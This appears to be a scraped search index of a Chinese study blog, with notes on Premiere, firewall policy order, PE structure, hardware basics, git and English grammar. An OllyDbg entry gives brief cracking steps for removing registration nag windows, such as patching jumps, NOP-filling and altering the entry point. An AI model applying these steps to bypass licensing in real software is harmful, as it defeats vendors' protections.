然后在效果控件里添加关键帧, 可以将关键帧拉开让它有一个过渡效果 此外还可以弄成下图这样..效果和上面区别还是有点的, 但我不知道怎么形容… 视频调整后, 原始音频跟不上可以使用ratio(R)工具进行拉伸 字幕 pr2019cc和老版真的是变化太多–这是我在看老版视频对着2019cc疯狂找字幕选项的感慨 我把字幕分为title和subtitle title在工具面板里如图所示 ​ 字体的各种特效在效果面板里 此外还可以从菜单界面的图形&gt;新建图层&gt;文本进入 subtitle可以使用新建字幕并设置如图以下选项 注意: 一定要选择开放式字幕, 不然字幕不会显示, 这是我少看一个字后得到的教训 关于这些解释这些标准的文章Premiere中的3种字幕制作工具 视频过渡也叫转场, 就是从一个视频到另一个视频的效果. 常用的过渡效果有3D运动, 溶解, 渐变擦除(可以自己用PS制作渐变效果) 可以直接导入PS源文件进PR","link":"/Premiere/PR-base.html"},{"title":"Premiere-shutcut-keys","text":"Record some common shotcut keys of PR shotcut keys brief c 剪裁工具(cut) v 选择工具 o/i 选择出点(out)/选择入点(in) Alt+mouse 拖动复制剪辑 left/right 向左/右前进一帧 &lt;–j/k/l–&gt; 倒放/暂停/播放 +/- 伸缩时间条 M/ctrl+M/ctrl+shift+M 添加标签/跳转标签 top/down 切换上/下一剪切点 Ctrl+D 插入默认转场 Shift+D 给当前选中添加转场","link":"/Premiere/Premiere-shutcut-keys.html"},{"title":"fw-rule","text":".. 一个关于防火墙策略的问题: 手册里有这么一句话: “整个系统的所有策略规则有特定的排列顺序。在流量进入系统时,系统会对流量按照找到的第一条与过滤条件相匹配的策略规则进行处理。” 我的理解: 防火墙的策略优先级高的应该设置为匹配范围小的, 优先级低的设置为匹配范围广的. 然后我在17年的赛题看到关于两个关于防火墙的题目及参考答案(拓扑图就是防火墙一端为internet, 一端为交换机) 题目: 关于策略方面的答案: 第3题配置了id 1,2 的策略可以理解, 第4题配置NAT后设置的策略我有点不能理解(红线部分): id为2的策略已经把所有(Any)流量匹配到了, 行为是拒绝 id为3的策略匹配范围更小, 优先级却在id2后面, 被id2拒绝后id3还有作用吗? 我尝试实践下我的理论: 我的拓扑为: 我的PC(192.168.1.2, 安全域:trust)—防火墙—–其他PC(192.168.10.1, 安全域:untrust) 路由,网关都配置好后如果没有配置策略是不能ping通的, 然后我配置了一条允许trust通往untrust的策略 可以ping通 把拒绝所有流量的优先级调高一点, 没有任何反应 也就是说第一跳拒绝所有流量的策略确实阻拦了所有流量, 所有第二条策略就没有用了.","link":"/Question/fw-rule.html"},{"title":"动态调试-OD","text":"OllyDbg（以其作者Oleh Yuschuk的名字命名）是一个x86 调试器，它着重于二进制代码分析。可以跟踪寄存器，识别过程，API调用，开关，表，常量和字符串 界面功能 快捷键 破解方向(无壳) 从消息框入手(MessageBox, GetDlgItemTextA…) 从提示字符串入手 比如提示消息窗口时暂停程序然后从调用堆栈里查找关键信息 直接查找字符串跟随地址分析 不建议不断使用断点进行调试, 大概率陷入死循环(windows使用消息队列将各种操作分配给应用程序, 如果没有从窗口执行操作, 那会导致消息队列为空, 导致循环) 去除NAG窗口Nag窗口就是软件的提示注册信息 找到调用窗口函数后可以通过以下方式解决它 改标志位 改跳指令(比如je–&gt;jmp) 使用nop填充(一个nop占一字节) 使窗口父句柄不存在 改入口地址(PE头的AddressOfEntryPoint) 技巧 call的返回值会赋值给EAX 找关键语句时需要注意领空, 一般修改的都是程序的领空而不是系统API的领空 术语参照 领空: 在某时刻CPU执行的代码的所有者, 004013F7一般是执行文件的领空, 7C8114AB一般是DLL的领空 VA(VirtualAdress) RVA(RelativeVirtualAddress) EP(EntryPoint) SEH(Structrued Exception Handling)","link":"/Reverse/OD.html"},{"title":"winPE结构","text":"PE(ProtbaleExecutable)可执行文件结构是一种规范, 用来指导系统如何执行你设计的程序. windows编译器会将代码以PE的形式编译链接成可执行文件. PE的优势就是它在硬盘的存储结构和在内存的存储结构是一样的 官方解释 windows PE结构 PE结构整体上可分为头+节区(区块), 头负责引导win加载器找区块的内容","link":"/Reverse/winPE.html"},{"title":"计算机概论","text":"理解一些计算机硬件的基础知识 CPU的架构 CPU内部有一些微指令，软件都要经过这些指令集来完成 1.精简指令集（Reduced Instruction Set Computer） RISC指令较为简单，运行时间短；若要执行复杂的事则需要多条指令 常见的有ARM,SPAPC等 2.复杂指令集（Complex Instruction Set Computer） CISC的每个小指令可以执行一些较为低级的硬件操作，指令复杂，每条指令能做很多事 比如AMD,Intel的x86架构 网桥 CPU通过主板连接组件，一些集成在主板上的芯片优劣对性能有影响，早期的芯片通过两个网桥连接各组件 北桥：负责连接速度较快的CPU、内存、与显卡等组件 南桥：连接较慢的设备接口，如硬盘、USB设备、网卡等 目前的架构将北桥整合到了CPU中 CPU的工作频率​ 因为早期的CPU架构主要通过北桥来连接CPU、内存、显卡，因此每个设备的工作频率都应该相同。于是出现了前端总线(FSB)，但CPU命令周期很快，为了满足FSB，于是有了外频和倍频 在早期的设计中，外频是指CPU与外部组件传输数据的速度，倍频是指CPU内部用来加速的一个倍数 CPU频率 = 外频 X 倍频 超频：指的是通过主板将CPU的外频和倍频提高成较高频率的方式，但一般倍频被厂家固定，改的是外频 现在CPU会自动帮你超频，自动降频（省电），例如Intel的turbo（睿频） 32位和64位CPU与总线“位宽” CPU内部有一个内存控制芯片，可以控制内存的频率 前端总线技术(Front Side Bus)：表示了CPU的内存控制芯片与内存间的传输速度 例如我的CPU最大支持的内存频率为2666MHz，每个周期能传输64bit（位宽），则我的内存最大带宽为2666MHz X 64bit = 21.3GB/s，又因为我买了两个组了双通道，总带宽为41.6GB/s CPU每次能处理的数据量叫字长word size，比如32位和64位，32位最大只能支持4GB/s的内存 CPU的等级​ 早期的x86架构有着不同的针脚和设计，目前的64位则称为x86-64，简称x64 ​ 很多软件都有针对CPU的一些设计，而新的CPU有着向下兼容的能力，使用软件时应该注意它对CPU的最低标准 超线程(Hyper - Threading)​ 现在的CPU都是多核CPU，而CPU的命令执行周期都很短，很多内核处于闲置状态，现在的操作系统都是多任务的，同时有很多程序让CPU来运行，于是想让CPU同时执行2个程序 简单实现：将重要寄存器分为两组，让程序分别使用这两组寄存器 使用超线程技术并不一定会提升性能，看情况而定，目前来说利大于弊 内存​ 目前个人电脑的内存主要部件位动态随机存取内存(Dynamic Random Access Mermory)：随机读写内存只有在通电时才记录，断电后数据消失 ​ DRAM又分好几代，有SDRAM和DDR(Double Data Rate) SRAM，DDR是双倍传输速度（类似倍频），他可以在一次时钟周期进行两次数据传输，DDR又分为DDR,DDR2(4倍),DDR3(8倍),DDR4 需要注意的是，DDR3L指的是降低了内存的工作电压，买主板要注意是否支持，不然会烧毁 多通道设计​ 因为所有的数据都放在内存，那么内存的位宽越大越好，一般位64bit，组合两根，则是128bit ​ 要启用两个（或四根）内存，那么这两根内存要一模一样最好，因为数据要同步进行读写，才能提高整体带宽 在主板上，内存糟要插相同的颜色，这是专门为了双通道设计的 DRAM&amp;SRAM​ 对于一些常用的数据如果放在CPU内部的话，就不用重复读取，提高了效率，于是设计了二级缓存 要整合到CPU内部，则L2的速度必须跟上CPU，这时候DRAM是无法满足的，需要SRAM(Static Radom Access Memory)，它在设计上使用的晶体管较多，成本很高，但速度快，用到CPU中是个不错的选择 只读存储器（ROM）​ 主板上有组件，组件的参数具有可调整性，比如CPU和内存的频率是可以调整的，而网卡、显卡的参数啥的都是记录在主板的CMOS芯片中，CMOS的读写是由主板上的一个存储芯片里的BIOS操作的，这个存储芯片不通电也能存储数据，是只读存储器(Read Only Memory). ​ ROM是一种非易失性的存储，BIOS 对于PC是很重要的，系统启动都会先去读去这个程序 ​ 固件(firmware)也是通过ROM来进行软件的写入，固件像软件一样会被系统执行，但他比硬件内部而言更重要，例如BIOS就是一个固件，控制这硬件的各种参数 ​ BIOS对于电脑非常重要，但电脑发展的实在是太迅速了，BIOS也要与时俱进，但ROM是无法改写的，所有现在BIOS通常写入类似闪存(flash)或电可擦除可编程只读存储器EEPROM(Electrically Erasable Programmable Read-Only Memory)存储硬件中 固件可以理解为固定在硬件上的控制软件 显卡​ 也叫VGA(Video Graphics Array)，显示图像的重点在于分辨率和颜色深度，每个图像显示的颜色会占用内存，所以显卡上也有集成内存显存 ​ 在早期，一些3D图像都是有CPU完成的，但运行程序时CPU已经很忙了，于是在显卡上嵌入了3D加速的芯片，成了现在的GPU ​ 显卡也算高速运算的组件，数据传输自然越快越好，现在用的是PCIe插槽，PCIe用的是类似管道概念来处理 规格 1x带宽 16x带宽 PCIe 1.0 250MB/s 4GB/s PCIe 2.0 500MB/s 8GB/s PCIe 3.0 1GB/s 16GB/s PCIe 4.0 2GB/s 32GB/s 书上一道题： 假设显示器使用1024X768分辨率，且使用全彩（每个像素占3B（RGB）），需要多少内存？ 答：因为有1024X768 = 786432的像素点，每个占3B，则需要2.25MB的内存 注意PCIe的插槽是与南桥连接还是与CPU直连，阅读主板的逻辑图例 硬盘和存储设备这里只是粗略了解一下机械硬盘，我在《30天自制系统》已经有所了解，不在赘述 使用机械硬盘要注意通电后别随意移动主机，以防数据损坏，为了让磁头归位，请使用系统关机 传输接口 具有一条数据线和电源线，还有一个跳线，只有不兼容才会使用 版本 带宽Gbit/s 速度MB/s SATA 1.0 1.5 150 SATA 2.0 3 300 SATA 3.0 6 600 传输10位编码时，8位是数据，2位是校验用的，bit转换位B为1:10，虽然理论可达600M/s，但由于物理因素，最快只能达到150M~200M左右 串行SCSI（Serial Attached SCSI），读写稳定速度快，一般用在服务器上，支持热插拔 版本 带宽Gbit/s 速度MB/s SAS 1.0 3 300 SAS 2.0 6 600 SAS 3.0 12 1200 USB 简介：USB，Universal Serial Bus（通用串行总线）的缩写，USB接口支持设备的即插即用和热插拔功能。 版本 带宽 速度 USB 1.0 1.5Mbps 192KB/s USB 1.1 12Mbps 1.5MB/s USB 2.0 480Mbps 60MB/s USB 3.0（USB 3.1 Gen 1） 5Gbps 500MB/s USB 3.1 Gen 2 10Gbps 1280MB/s 固态硬盘 SSD(Solid State Disk)，利用闪存做的存储设备，相对于机械硬盘，没有驱动马达，延迟低，速度快，还省电 缺点：早期的SSD闪存写入次数有限制，用大概两年就GG，现在的SSD大概用5~6年(不同规格寿命不同) 操作系统 想让电脑执行程序，就得要参考一堆硬件功能的函数，还要学习机器语言，并且每次写程序都有重新改写，如果将所有的硬件都驱动，提供一个软件的参考接口开发软件，就好多了，这就是操作系统 内核(Kernel) OS也是一组程序，这组程序的重点是可以管理电脑的所有活动和驱动系统中的所有硬件 比如让CPU逻辑判断和计算 内存读写代码 让网卡传输数据等 实现上述的功能就是操作系统的内核 系统调用(System Call)​ 硬件都由内核管理后，开发软件还要去参考内核的功能，还是很麻烦 于是OS会提供一套应用程序的编程接口(Application Programing Interface)，用来给程序员开发，就比如学习C语言只需要学习C的函数就行了，然后系统调用会直接将C的相关语法转换为内核可以看懂的任务函数 图中的概念 因为内核是参考硬件规格做的，所有同一系统不能在不同硬件结构下执行，例如windows不能在ARM下运行 OS只是管理整个资源，CPU、内存、输入输出设备、文件系统等 应用程序是参考API写的，所以不同操作系统不能运行 内核功能 系统调用接口(System call interface) 方便程序员与内核的沟通 进程管理(Process control) 分配多个任务给CPU时，可以有效的加快性能 内存管理(Memory management) 因为程序代码和数据都是放在内存中的，内核一般会提供虚拟内存的功能，内存不足会提供交换(swap)分区的功能 文件系统管理(Filesystem management) 文件系统的管理，例如数据的输入输出等工作，还有不同文件格式的支持等，如果你的内核不支持某各文件系统，你就无法使用这个格式的文件 设备驱动(Device drivers) 用来管理硬件 操作系统与驱动 OS要能够驱动硬件，应用程序才能使用硬件功能 一般来说，操作系统会提供API给开发商编写驱动 驱动由厂家提供 参考《鸟哥的Linux私房菜 基础学习篇》","link":"/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A6%82%E8%AE%BA.html"},{"title":"计算机基本科学","text":"注：以下内容包括图片均截取自 Youtube Crash Course的视频，若有侵权请联系我 计算机发展历史 为了减少人类工作量，出现算盘 然后有了步进计算器（原理就是数个齿轮，每个有十个齿，表示0-9，每加到9时，再加1会到0，前面的齿轮+1，就像算盘，减法相反，乘除不过是多个加减），可以做加减乘除 computer最开始是指计算的人，后来才指机器 因为计算机可以减少很多人力物力，然后计算机高速发展 电子计算机机电 早期使用机械继电器连接电路， 比如控制马达，使齿轮+1（每秒50次） 缺点：因为是机械，所以有延迟，磨损。 要排除故障太费力，还会吸引臭虫（bug） 热电子管（玻璃） 二极管（单向流动）： 一极加热放出电子，另一极吸引正电子（电流）； 三极管：在二极管的基础上加一个控制电极，施加正电允许电子流动，负电阻止电子流动（与继电器功能一样，断开和闭合电路，但没有磨损） 。 缺点：成本高， 会向灯泡一样被烧坏； 晶体管（固态） 中间是半导体，可以控制半导体的导电性来控制电流。 每秒10000次； 体积更小，因为是固体，所以相对于热电子管更经用；（现在晶体管的小于50nm，而一张纸的厚度是10,000nm，每秒几百万次，工作时间更耐久） 后来采用二进制进行计算 布尔逻辑和逻辑门 使用两种状态就可以表示所有东西了。 晶体管不仅可以开和关， 还可以让不同大小的电流通过，早期的计算机有三进制和五进制，但是进制越多越难区分信号（被干扰） 早期数学已经开始研究二进制了，已经解决了所有运算法则（布尔代数） 三个基本布尔操作 NOT：将布尔值反转 AND：有false则output为false（将晶体管串联实现） OR：有true则为true XOR：相同则为false；不同为true 寄存器和内存因为使用ALU计算后的数值需要存起来，于是有了内存。 RAM（Random Access Memory随机存取存储器）： 只在通电时数据是保留的 锁存器 可以记录一位信息 寄存器 并排存放的一组锁存器 寄存器能存一个数字，这个数字有多少位叫位宽 Memory 因为要存更多数据，并排存放的话需要很多数据线，此时需要用矩阵 ​ 那如何确定一个地址呢： 使用“多路复用器（Multplexers）” 原理（将行和列转化位8位二进制） 抽象化 256-bit-memory 256-byte-memory 可以将上面整体看成一个可寻址内存（RAM）： 以上内存是一个静态内存SRAM,现在有DRAM等很多 ALU在CPU里面，ALU主要负责计算和判断 算术单元（arithmetic）负责加减 半加器（Half adder） 功能：输入两个bit，输出两个的和（SUM）及进位（CARRY） 实现： 全加器（Full adder） 功能：三个输入bit，同样输出sum与carry 实现电路： 例子（8位行波进位加法器） 超出所表示位数表示“溢出”，后果很严重。 ps：现在使用超前进位加法器 逻辑单元（logic） 用来执行一些逻辑操作，比如AND OR NOT等，还有判断是否为负数，是否为0等 抽象化： 自建CPU组件 需要RAM 假设一个操作码（opcode） 前四位： ​ 后四位表示地址 所需寄存器 指令地址寄存器：追踪程序运行到哪里，存当前指令的内存地址 指令寄存器：存当前指令 启动计算机时，寄存器从0开始 CPU工作阶段FETCH PHASE 取指令阶段 将指令地址寄存器连接到RAM，寄存器的值为0，RAM返回地址0的值 将值给指令寄存器 DECODE PHASE 解码阶段 识别操作码电路 EXECUTE PHASE 执行阶段 操作码正确可以打开RAM的允许读取线 这里说的是将地址14的数据放入寄存器A（RAM需要连接所有寄存器） 这个阶段完成，指令地址寄存器+1","link":"/computer-internal/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6.html"},{"title":"git指令","text":"记录一些日常常用指令，参考廖雪峰的git教程 ssh协议不需要每次输密码，使用的是密钥对 https协议需要每次输入账户名和密码 12git config --global user.name &quot;Your Name&quot;git config --global user.email &quot;email@example.com&quot; git init初始化git repo git add filename1 filename2添加至暂存区 git commit -m &quot;commit-mes&quot;提交到本地库，会得到40位的哈希值id，类似快照 直接输入git commit会进入vim让你写提交信息 使用单引号输入多行信息 git commit amend修改上一个提交 git status显示工作区状态 git diff filename如果有文件被修改过，可以使用diff查看修改的内容 diff格式@@ -1,2 +1,4@@表示“修改前的1行开始连续2行变成了修改后的1行连续4行” git log查看提交历史 git reset --hard commit_id回退版本 HEAD^表示前一个版本 HEAD3表示三个^ git reflog查看命令历史，可以得到每个版本的commit_id git checkout -- filename丢弃工作区的修改回到最新版本 git reset HEAD filename该文件回到最近一次commit或者丢弃暂存区的修改 git rm filename删除文件，然后提交；手动删除，add-commit也行 连接远程仓库在家目录下打开终端输入ssh-keygen -t rsa -C email.com 得到密钥对，将公钥添加到远程仓库即可 git remote add origin git@sever-name:path/repo-name.git关联远程仓库 git push -u origin master第一次推送 git push orgin master后续推送（可选择不同的分支） git clone git@sever-name:path/repo-name.git克隆远程仓库 默认克隆只有master分支 想要在其他分支工作必须创建并关联远程分支 git switch -c branch-name origin/branch-name创建，此时已经可以提交了 当你和其他工作伙伴同时在同一分支提交同一个修改时，会出现以下情况 12345678910111213141516171819202122232425262728$ git push origin dev Username for 'https://github.com': yangchaohePassword for 'https://yangchaohe@github.com': To https://github.com/yangchaohe/learngit.git ! [rejected] dev -&gt; dev (fetch first)error: 推送一些引用到 'https://github.com/yangchaohe/learngit.git' 失败提示：更新被拒绝，因为远程仓库包含您本地尚不存在的提交。这通常是因为另外提示：一个仓库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更提示：（如 'git pull ...'）。提示：详见 'git push --help' 中的 'Note about fast-forwards' 小节。# manu @ MY in ~/learngit on git:dev o [20:26:31] C:1$ git pull remote: Enumerating objects: 5, done.remote: Counting objects: 100% (5/5), done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 3 (delta 0), pack-reused 0展开对象中: 100% (3/3), 284 字节 | 94.00 KiB/s, 完成.来自 https://github.com/yangchaohe/learngit f3e318a..df2aa02 dev -&gt; origin/dev当前分支没有跟踪信息。请指定您要合并哪一个分支。详见 git-pull(1)。 git pull &lt;远程&gt; &lt;分支&gt;如果您想要为此分支创建跟踪信息，您可以执行： git branch --set-upstream-to=origin/&lt;分支&gt; dev 使用git branch --set-upstream-to=origin/&lt;分支&gt; dev关联远程仓库的分支 再使用git pull将其他提交抓取下来进行修改再push git remote -v查看远程仓库信息 多个伙伴在同一个分支提交时，提交历史会分叉，使用git rebase即可 分支git branch查看当前分支 git branch &lt;name&gt;create branch git switch/checkout &lt;name&gt;切换分支 git switch -c &lt;name&gt;,git checkout -b &lt;name&gt;创建并切换 git merge &lt;name&gt; -m &lt;message&gt;合并分支 git branch -d &lt;name&gt;删除分支 如果两个分支同时修改同一个文件的同一行内容，合并时就会发生冲突（修改不同行不会） 此时查看文件内容如下 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADmaster90=======test190&gt;&gt;&gt;&gt;&gt;&gt;&gt; test1 需要修改再提交，然后使用git log --graph --pretty=oneline --abbrev-commit可以查看分支合并情况 12345678910111213* f47d28d (HEAD -&gt; master) confict fix|\\ | * 9c16d81 (test1) test1* | 082c980 master* | 0ada1fe Merge branch 'test1'|\\| | * 3b4a2fd 位于分支 test1 要提交的变更： （使用 &quot;git restore --staged &lt;文件&gt;...&quot; 以取消暂存） 修改： readme.txt* | 771f5e1 位于分支 master 要提交的变更： （使用 &quot;git restore --staged &lt;文件&gt;...&quot; 以取消暂存） 修改： readme.txt|/ * 73c59da tset* 48be542 remove rademetxt* bd16a3e A A A A* bb669d2 test test2 使用git log --graph可以查看详细提交信息 注意，git merge默认是“Fast-forword（改变指针指向）”模式，这样的合并是没有记录历史分支的，从图上也就看不出是否分支，需要加上--no-ff使用普通模式合并 一般工作都是在dev上，master用来发布 当在其他的分支工作没完，想把工作状态存储在那个分支时，需要使用stash git stash将工作状态暂存，可存储多个 git stash pop取出最后放入的工作状态，并删除stash的内容 git stash apply@{index}指定取出，不删除 git stash drop删除最后放入的工作状态 git stash show显示详细信息 存储顺序有点像先进后出 当在别的分支修改的数据想应用到其他分支时，只需要在其他分支复制一份提交即可 指令：git cherry-pick &lt;commit_id&gt; 复制除了提交id不一样，其他包括提交信息，时间都一样 如果要丢弃一个没有被合并过的分支，可以通过git branch -D强行删除 标签描述每个版本不可能用哈希值，git使用tag与commit_id结合起来 git tag &lt;tagname&gt; &lt;commit_id&gt;会默认把当前的HEAD打上标签，可在后面指定commit-id git tag &lt;tagname&gt; -m &quot;描述&quot; git tag查看所有标签 git show &lt;tagname&gt;显示详细信息 git push origin &lt;tagname&gt;推送某标签到远程仓库 git push origin --tags推送所有标签 git tag -d &lt;tagname&gt;删除本地标签 删除远程仓库的标签要先删本地标签再使用指令 git push origin :refs/tags/&lt;tagname&gt; 忽略如果需要忽略某些文件时，可以编写.gitgnore文件，在里面写上文件名即可，官方模板 别名1234567git config --global alias.st statusgit config --global alias.unstage &quot;reset HEAD&quot;git config --global alias.br branchgit config --global alias.ci commitgit config --global alias.co checkoutgit config --global alias.st statusgit config --global alias.lg &quot;log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit&quot; status中文乱码默认的配置里, 使用中文命名并使用git status查看会得到中文的字符码, 可以通过下面的指令解决 1git config --global core.quotepath false 或者修改配置文件~/.gitconfig 123456789101112[gui] encoding = utf-8 # 代码库统一使用utf-8 [i18n] commitencoding = utf-8 # log编码 [svn] pathnameencoding = utf-8 # 支持中文路径 [core] quotepath = false # status引用路径不再是八进制（反过来说就是允许显示中文了） 参考解决git-status不能显示中文 git 修改本地和远程分支名称git branch -a #查看所有分支git branch -r #查看远程分支git branch -vv #查看本地分支所关联的远程分支git branch -m old_branch new_branch # Rename branch locallygit push origin :old_branch # Delete the old branchgit push --set-upstream origin new_branch或者git push -u origin new_branch# Push the new branch, set local branch to track the new remote 当远程分支显示不全时，使用git fetch可以抓取远程分支 submoduleGit子仓库深入浅出","link":"/devTool/git.html"},{"title":"01-什么是名词？","text":"零基础自学英语第一天，什么是名词？声明：此分类笔记参考 morty 老师的课程。 句子=主语 (noun)+ 谓语 (verb) 主语就由名词构成，名词有很多类型 名词短语例如：a good boy. 名词短语由下面部分组成 限定词 + 修饰词 (adj)+ 主体词 (n) 限定词构成 冠词 a,an,the.. 形容性物主代词 my,this… 名词所有格 one’s,Tom’s.. 指示代词 this,that.. 不定代词 some,every,another.. 基数词 one,two… 疑问代词 what,which… 组成名词短语 (有一些可以省略) 省略修饰词 a good boy. a boy. 省略限定词 Cs(Countable noun,s 表示复数) 情况下 boys. good boys. U(Uncountable noun) good news news 专有名词 (省略限定词，修饰词) China Tom 省略主语 主体词在笼统、明显的情况下可以省略 the rich (people) the best (student) these (books) #可数名词和不可数名词可数 单数（a/an） 复数 规则 不规则 不可数 直接写 量化 可数化 代词1.人称代词 主格 (S主) 宾格 (O宾，P 表) 形物代 (adj) 名物代 反身代 I me my mine myself You you your yours yourself He him his his himself She her her hers herself It it its its itself We us our ours ourselves You you your yours yourselves They them their theirs themselves 主格做主语 eg(exempli gratia): I like English. 宾格做宾语或者表语 eg: I hate him. It is me. 形物代 eg: This is my book. 名物代 This book is mine. 反身代 I love myself. I love her. 2.指示代词This(表示这) This is a book. That(表示那) That is a book. These(表示这些) These are books. Those(那些) Those are books. That 和 Those 还有一些特殊的用法 that 还可以指代可数单数，不可数名词 The weather of GuiZhou is cooler than that of GuangZhou. those 指代可数复数 The oranges of GuiZhou are sweeter than those of GuangZhou. 3.不定代词常用不定代词 第一组: some,any(任何),every(每一个),each(每一个),no(没有) 第二组: both(两者都),either(两者之一),neither(两者都不),all(三者以上都),none(三者以上都不) 第三组: many,much,more(比较级，更多),most(最多) 第四组: little,a little,few,a few(有 a 表示肯定，还是有的) 第五组: other,others,another,the other,the others 第六组: half,several(几个) 复合不定代词 使用上面的代词与一些名词组合 every some thing any one no body 这就有了 12 种组合 4.疑问代词Who is he? What do you want? 放在句首强调疑问 数词1. 基数词one,two,three… 细分的话还有整数，小数，分数，百分数 分数 分子用基数 分母用序数 (当分子&gt;1 时分母变复数), 2. 序数词first,second,third… 名词短语，代词，数词都是笼统的 (一生来咀嚼？?) 不定式to+ 动词原型构成的短语，比如 To learn English well. 动名词比如 smoking 句子如 You is a pig. 不定式，动名词，句子的特点： 作主语看作单数 To learn English well is very important. “头重脚轻”，使用 It 作形式主语/宾语 It is very important To learn English well 先说用处，再说主语","link":"/English/G/01-%E5%90%8D%E8%AF%8D.html"},{"title":"02-定语&#x2F;动词","text":"前面说的名词是词性，而主语是成分. 名词可以做主语，宾语，表语，同谓语，宾补. 而主语也是由６种名词类型充当的 定语 修饰名词（能将名词范围从大变小(笼统–&gt;具体)） 形容词性 One-third of the students in this class are girls. One-third是主语,the students是定语(将1/3的范围缩小了),in this class又把the students缩小了. 1.定语分类可以把定语分为两类 前置定语 a good boy.(单个,独立,不一定只有一个) 后置定语 a boy under the tree.(短语,句子) 2.定语构成副词用作定语为什么说副词用作定语呢,副词不是修饰动词的吗? 相当于省略掉了动词,如下例子 People (living/being)there are very friendly. He didn’t like the man (living)downstairs. 形容词短语作定语 The next man is a scientist. The man next to me is a scientist. 介词短语作定语 The boy under the tree is Tom. The tallest boy in our class is John. 现在分词短语、过去分词短语、动词不定式做定语 I have something to say.(to say将something缩小了) The boy crying over there is my classmate. The house built last year is impressive. 定语从句 He still remember the day when he first stepped into the Old Trafford. 动词谓语就是由动词构成的. 动词可以构成谓语和非谓语. 动词又分为以下几类： 助动词起辅助作用，不能单独构成谓语． be动词常用: am、is、are、was、were、be 用法: be+doing/done. 情态动词常用 can、could (能够) will、would (将要) shall、should (应该) may、might (可能) must、[have to] (必须) need、dare (需要) had better (最好) 用法: 情态+do. 特点 不能单独构成谓语 后接动词原形(+do) 无人称变化(I can..He can..) 有自身含义 狭义助动词常用: do、does、did 用法: +do 完成助动词帮助构成完成时. 常用: have、has、had 用法: +done. 作用 帮助构成时态 The boy is crying.(进行) He has arrived.(完成) I have been painting all day.(完成+进行) 帮助构成否定句和疑问句 Does he like English?(疑问) He doesn’t have lunch at home.(否定) 帮助构成被动语态 Trees are planted in spring.(被动) The house has been pulled down.(完成+被动) *帮助构成虚拟语气 If he had come yesterday, I wouldn’t have made such a mistake. *帮助构成到装句 So much did he love his mother that he bought her many presents on her birthday. 帮助构成强调意义 He did come yesterday. He did(实义) his homework at seven o’clock. Did(助) he do(实义) his homework yesterday? 实义动词也叫行为动词，表示具体的动作（分为外部：打你，内部：爱你） 及物动词vt后面需要接宾语(S+V+O): I love you.[动宾] 不及物动词vi 不接宾语(S+V): Time flies. 使用介词连接宾语 (S+V+O): I look at the man[介宾]doesn’t have (S+V): The meeting began at six. 系动词后面接表语，表示主语是什么或怎么样，不表具体动作 表状态doesn’t haveBe,stay,keep,remain,lie,stand,exist 表感官fell,smell(闻),taste(尝),look,sound 表变化become,go,get,turn,fall 表像seem,appear(似乎，好像) 动词分类的问题： Be是助动词、实义动词，还是系动词？ 看他是否辅助动词进行判断助动词和实义动词 He is(助) playing(实义) football. He is(助) asked(实义) to do this job. 看它是否表示具体的动作可以区分系动词 He is(系) a student(状态). His hobby is(系) playing football(这是爱好，没有具体的动作). 区分实义动词和系动词 He goes(实义) to school by bike. The food goes(系) bad.(表变化) He turns(实义) around. The leaves turns(系) yellow.(表变化)","link":"/English/G/02-%E5%AE%9A%E8%AF%AD%E5%8A%A8%E8%AF%8D.html"},{"title":"03-谓语&#x2F;虚拟语气&#x2F;倒装","text":"谓语是句子的重要部分，由动词构成 简单的谓语构成 实义动词(词组)单独构成 I like English. He practices running every morning. 词组 I find out the truth. I look at the bird.(vi+介) 系动词单独构成+表语 He is a student.(表状态) We are students. Your idea sounds great.(听起来,感官) 小技巧: 将系动词换为be动词差别不大说明是系动词 Your idea sounds(is) great.(区别不大,是系动词) I have(am) a dream.(区别很大,不是系动词) 助动词+实义动词/系动词 助动词+实义 You can help me. You may keep the book for two weeks. He has caught a bad cold. My sister is crying over there. I have been waiting for you all the time.(两个助动词) I would stay at home all day. 助动词+系动词 [Be]He is being a student.(be+doing表进行,be+done表被动) [情]He can be a student.(情态动词+动词原形) [狭义]He does be a student.(一般不这么说) [完成]He has been a student for five years.(完成助动词+动词过去分词形式) 复合谓语公式情态动词+完成助动词+be动词+实义动词+介词 would+have+been+looking+for.. 虚拟语气基础虚拟代表它不是真的. 先看看真实的情况: I am a student [now]. I was a student [before]. I will be a student [in the futrue]. 可以看到,这些谓语都很精确的代表了现在,过去,将来. 不用在后面添加[]的内容. 而虚拟语气就是将时态前移,使谓语不精确 时态 前移时态 do, does(一般现在) did(一般过去) did(一般过去) had done(过去完成) will do(一般将来) would do(过去将来) would have done(将来完成) have/has done(现在完成) had done(过去完成) 虚拟语气常常有if. 如:If he had come yesterday, I wouldn’t have made such a mistake. 将它变成真实的情况: He came yesterday, I would make such a mistake. 倒装基础陈述是S+V,而倒装则是V+S.但倒装又分为完全倒装和部分倒装. 倒装是有条件的,不是想倒就倒的. 完全倒装 方位 介词 提前 陈述: The boy sits under the tree. 倒装: Under the tree sits the boy. 方位 副词 提前 陈述: The bus comes(vi) here(adv). 倒装: Here comes the bus. 注意: 如果主语是人称代词,则不用倒 He comes here.–&gt;Here he comes. 部分倒装 否定 介词 提前 陈述: I will(助) by no means forget(实义) her. 倒装: By no means will I forget her. 否定 副词 提前 陈述: I will never(adv) forget her. 倒装: Never will I forget her. 句子如果是主系表结构, 将系动词提前既是完全倒装也是不完全倒装","link":"/English/G/03-%E8%B0%93%E8%AF%AD%E8%99%9A%E6%8B%9F%E8%AF%AD%E6%B0%94%E5%80%92%E8%A3%85.html"},{"title":"04-非谓语","text":"要理解非谓语首先要知道抽象思维: 透过表象看本质. 非谓语总的有三大类 to do doing done 例子 类型 例子 类型 to be having to do to have written to do playing doing written done being built doing to come to do gone done drunk done 注意: 有些词的过去式和过去分词是一样的, 这时区分非谓语需要看语境 如: make made made She made the cake.[主动作谓语] The cake made by her is good.[被动作非谓语] 谓语和非谓语谓语由动词构成, 但动词不只构成谓语, 它还可以构成非谓语. 产生谓语的条件 S+V S+V (and-or-but) V/S+V,V and V. S+V 连接词(并, 介) S+V. 英语第一原则: 在主谓结构里面, 只能有一个谓语(其他都是非谓语) 非谓语的本质 名称 抽象 本质 运用 